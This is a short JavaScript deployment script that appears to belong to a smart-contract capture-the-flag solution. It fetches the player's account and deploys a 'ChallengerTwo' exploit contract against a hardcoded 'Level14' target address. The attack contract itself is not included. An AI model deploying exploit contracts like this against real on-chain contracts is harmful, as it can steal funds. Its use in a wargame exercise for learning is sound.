const level14 = async (web3, deployer, ChallengerTwo) => {

    const targetAddress = '0xdfcc4891d3e1946ed0985477de57aa4683bbbb46';
    console.log(`Exploiting Level14 target ${targetAddress}...`);

    console.log('Retrieving player address...');
    const player = (await web3.eth.getAccounts())[0];

    console.log('Deploying the challenger contract...');
    await deployer.deploy(ChallengerTwo, targetAddress, {from: player});
};

module.exports = level14;